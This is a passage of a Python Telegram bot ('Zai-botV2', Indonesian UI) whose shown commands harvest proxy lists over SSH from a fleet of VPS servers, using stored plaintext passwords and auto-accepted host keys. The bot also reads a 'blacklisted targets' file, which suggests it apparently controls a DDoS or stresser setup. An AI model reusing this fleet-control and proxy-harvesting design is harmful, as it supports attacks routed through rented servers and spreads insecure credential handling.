        if interval < 3600:
            time_str = f"{interval // 60} menit"
        elif interval < 86400:
            time_str = f"{interval // 3600} jam"
        else:
            time_str = f"{interval // 86400} hari"
        
        bot.reply_to(
            message,
            f"✅ **Auto scrape diaktifkan!**\n\n"
            f"⏱️ Interval: setiap {time_str}\n"
            f"📁 Hasil: `/root/methods/proxy.txt`\n\n"
            f"Gunakan `/autoscrape off` untuk mematikan.",
            parse_mode='Markdown'
        )
        
        # Jalankan sekali langsung
        run_scrape_on_all_vps(chat_id)
        
    except ValueError:
        bot.reply_to(message, "❌ Interval harus berupa angka!")

@bot.message_handler(commands=['autoscrape_status'])
def auto_scrape_status(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    with open("./data/admin.json", "r") as e:
        admin = json.load(e)
        admins = admin["admin"]
    
    if user_id not in admins:
        bot.reply_to(message, "🚫 Akses ditolak.")
        return
    
    if chat_id in auto_scrape_jobs:
        job = scheduler.get_job(auto_scrape_jobs[chat_id])
        if job:
            remaining = job.next_run_time - datetime.now()
            minutes = remaining.total_seconds() // 60
            bot.reply_to(
                message,
                f"✅ **Auto scrape SEDANG BERJALAN**\n\n"
                f"⏰ Next run: {job.next_run_time.strftime('%H:%M:%S')}\n"
                f"⏱️ Sisa: {int(minutes)} menit\n\n"
                f"Gunakan `/autoscrape off` untuk mematikan.",
                parse_mode='Markdown'
            )
        else:
            bot.reply_to(message, "⚠️ Job tidak ditemukan.")
    else:
        bot.reply_to(message, "❌ **Auto scrape TIDAK AKTIF**\n\nGunakan `/autoscrape <detik>` untuk memulai.", parse_mode='Markdown')


# ========== COMMAND SCRAPE MANUAL ==========
@bot.message_handler(commands=['scrape'])
def scrape_manual(message):
    user_id = message.from_user.id
    
    with open("./data/admin.json", "r") as e:
        admin = json.load(e)
        admins = admin["admin"]
    
    if user_id not in admins:
        bot.reply_to(message, "🚫 Akses ditolak.")
        return
    
    bot.reply_to(message, "🔄 **Menjalankan scrape di semua VPS...**\n\nTunggu sebentar.")
    run_scrape_on_all_vps(message.chat.id)


# ========== COMMAND COLLECT PROXY ==========
@bot.message_handler(commands=['collectproxy'])
def collect_proxy(message):
    user_id = message.from_user.id
    
    with open("./data/admin.json", "r") as e:
        admin = json.load(e)
        admins = admin["admin"]
    
    if user_id not in admins:
        bot.reply_to(message, "🚫 Akses ditolak.")
        return
    
    status_msg = bot.reply_to(message, "🔄 **Mengumpulkan proxy dari semua VPS...**", parse_mode='Markdown')
    
    with open("./data/vps_servers.json", "r") as f:
        vps_list = json.load(f)
    
    all_proxies = set()
    results = []
    
    for vps in vps_list:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(vps['hostname'], username=vps['username'], password=vps['password'], timeout=10)
            
            cmd = "cat /root/methods/proxy.txt 2>/dev/null || echo ''"
            stdin, stdout, stderr = ssh.exec_command(cmd)
            content = stdout.read().decode().strip()
            
            if content:
                proxies = [p for p in content.split('\n') if p and ':' in p]
                all_proxies.update(proxies)
                results.append(f"✅ {vps['hostname']}: {len(proxies)} proxy")
            else:
                results.append(f"⚠️ {vps['hostname']}: File kosong/tidak ada")
            
            ssh.close()
        except Exception as e:
            results.append(f"❌ {vps['hostname']}: {str(e)[:40]}")
    
    # Simpan hasil gabungan
    os.makedirs("/root/methods", exist_ok=True)
    with open("/root/methods/proxy_all.txt", "w") as f:
        f.write("\n".join(sorted(all_proxies)))
    
    bot.edit_message_text(
        f"✅ **Proxy Collection Selesai!**\n\n" +
        "\n".join(results) +
        f"\n\n📊 **Total Proxy Unik: {len(all_proxies)}**\n"
        f"📁 Disimpan: `/root/methods/proxy_all.txt`\n\n"
        f"Gunakan `/getproxy` untuk lihat atau `/downloadproxy` untuk download.",
        chat_id=message.chat.id,
        message_id=status_msg.message_id,
        parse_mode='Markdown'
    )


# ========== COMMAND GETPROXY ==========
@bot.message_handler(commands=['getproxy'])
def get_proxy_list(message):
    user_id = message.from_user.id
    
    with open("./data/admin.json", "r") as e:
        admin = json.load(e)
        admins = admin["admin"]
    
    if user_id not in admins:
        bot.reply_to(message, "🚫 Akses ditolak.")
        return
    
    proxy_file = "/root/methods/proxy_all.txt"
    
    if not os.path.exists(proxy_file):
        bot.reply_to(message, "❌ File belum ada. Jalankan `/collectproxy` dulu.", parse_mode='Markdown')
        return
    
    with open(proxy_file, 'r') as f:
        proxies = f.readlines()
    
    total = len(proxies)
    if total == 0:
        bot.reply_to(message, "⚠️ File proxy kosong.")
        return
    
    preview = "".join(proxies[:20])
    if total > 20:
        preview += f"\n... dan {total - 20} proxy lainnya."
    
    bot.reply_to(message, f"📋 **Proxy List ({total} total):**\n\n```\n{preview}\n```", parse_mode='Markdown')


# ========== COMMAND DOWNLOADPROXY ==========
@bot.message_handler(commands=['downloadproxy'])
def download_proxy(message):
    user_id = message.from_user.id
    
    with open("./data/admin.json", "r") as e:
        admin = json.load(e)
        admins = admin["admin"]
    
    if user_id not in admins:
        bot.reply_to(message, "🚫 Akses ditolak.")
        return
    
    proxy_file = "/root/methods/proxy_all.txt"
    
    if not os.path.exists(proxy_file):
        bot.reply_to(message, "❌ File belum ada. Jalankan `/collectproxy` dulu.", parse_mode='Markdown')
        return
    
    with open(proxy_file, 'rb') as f:
        bot.send_document(message.chat.id, f, caption="📦 File proxy_all.txt - Hasil dari semua VPS")

# ===== SAMPAI SINI =====
if __name__ == "__main__":
    os.system('clear')
    init()
    read_blacklisted_targets()
    
    print(Fore.WHITE, """
███████╗ █████╗ ██╗        ██████╗  ██████╗ ████████╗
╚══███╔╝██╔══██╗██║        ██╔══██╗██╔═══██╗╚══██╔══╝
  ███╔╝ ███████║██║        ██████╔╝██║   ██║   ██║   
 ███╔╝  ██╔══██║██║        ██╔══██╗██║   ██║   ██║   
███████╗██║  ██║██║        ██████╔╝╚██████╔╝   ██║   
╚══════╝╚═╝  ╚═╝╚═╝        ╚═════╝  ╚═════╝    ╚═╝""", Fore.RESET)
    
    print(Fore.MAGENTA, "Code by @zaibuzaiii", Fore.RESET)
    print(Fore.BLUE, "Zai-botV2 Started.", Fore.RESET)
    
    connected_count = 0
    for vps in vps_list:
        vps_connection_status = check_vps_connection(vps['hostname'], vps['username'], vps['password'])
        if vps_connection_status is True:
            connected_count += 1
        else:
            print(Fore.RED, f"[Warning] Hostname {vps['hostname']} failed to connect", Fore.RESET)
    
    print(f"[System] Total servers connect : {connected_count}")
    scheduler.start()
    bot.infinity_polling()